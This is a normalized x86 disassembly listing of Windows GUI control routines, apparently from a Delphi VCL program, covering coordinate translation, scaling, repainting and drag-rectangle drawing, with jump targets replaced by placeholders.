push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43da08
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43da34
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_459cdc
sub_43da64
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_43f0c4
sub_43dae0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call MulDiv
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call MulDiv
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_41c918
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_41c934
sub_43dcac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_43dd42
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4198d8
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_43dec4
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_4043c8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43dd49
lea eax [ ebp - 0x8 ]
call sub_403fbc
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_43def4
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_43dd50
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_43dd98
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
call sub_4039f8
test esi esi
je r-xdata
mov edx ebx
call sub_441370
mov edx ebx
mov eax esi
call sub_44129c
mov eax ebx
call sub_43d518
sub_43dde4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_403468
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_43f0c4
mov eax edi
mov si 0xffd0
call sub_403468
sub_43de7c
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_4521d4
mov edx ebx
mov eax esi
call sub_419450
sub_43dea0
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_43f0c4
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_43f0c4
pop ebx
retn
sub_43dec4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_43de38
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_4040ac
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_43de48
sub_43def4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43df49
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43dec4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4043c8
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43df50
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
mov eax esi
call sub_40447c
mov edx eax
mov eax ebx
call sub_43dea0
sub_43df74
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_41c874
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_43f0c4
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_41c874
mov [ ebx + 0x84 ] eax
sub_43e0fc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43e0ec
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_43b094
mov eax esi
call sub_43b094
jmp r-xdata
sub_43e134
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_413a24
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_4138b8
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_413a44
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43e30c
mov eax ebx
call sub_455b34
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_403468
sub_43e1b4
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_43e134
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_43e134
jmp r-xdata
sub_43e1d8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_43e26e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e275
lea eax [ ebp - 0xc ]
call sub_403fbc
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b450
call sub_4039f8
sub_43e280
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_413a24
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_4139c8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_43d864
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43e30c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4449fc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43d864
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4446f8
push eax
call InvalidateRect
push ebp
call sub_43e280
pop ecx
test al al
je r-xdata
mov al 0x1
sub_43e3a8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_455b0c
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_43f0c4
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_403468
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43e40c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4449fc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4446f8
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_43e4e5
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_442504
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4446f8
push eax
call ReleaseDC
retn
sub_43e584
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov eax edi
call sub_43f0f8
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
call sub_4039f8
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_43da08
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406994
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_43f0c4
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_43c214
sub_43e648
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43e680
test al al
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
call sub_43c44c
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov [ rw-data ] 0xffffffff
sub_43e68c
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_43e6c8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_43e714
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_43e740
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_43de68
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_43de54
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_402a68
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_402a68
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_4446f8
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_43e824
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_43e870
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_403468
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_403468
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_43e934
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_43e980
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_43e9cc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43eae7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_41ce94
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43eaee
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_43eb20
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_43da08
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_403468
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_403468
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_403468
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_403468
jmp r-xdata
sub_43ec10
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_41256c
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_43f0f8
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_43de54
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_43de68
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_4125bc
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43edf0
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_43d9dc
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_403468
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
